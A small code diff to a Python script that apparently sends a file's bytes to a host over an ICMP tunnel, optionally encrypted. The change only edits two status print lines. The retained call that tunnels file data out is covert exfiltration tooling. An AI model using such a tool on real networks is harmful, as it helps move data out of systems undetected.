@@ -114,6 +114,6 @@ if __name__ == '__main__':
         print(f'[+] Read {len(data)} bytes from {filename}')
 
     # run
-    print(f'[+] sending..', end=' ', flush=True)
+    print('[+] sending..')
     icmp_tunnel(hostname=hostname, data=data, filename=filename, count=1, encrypt=is_encrypt)
-    print('done')
+    print('[+] done')
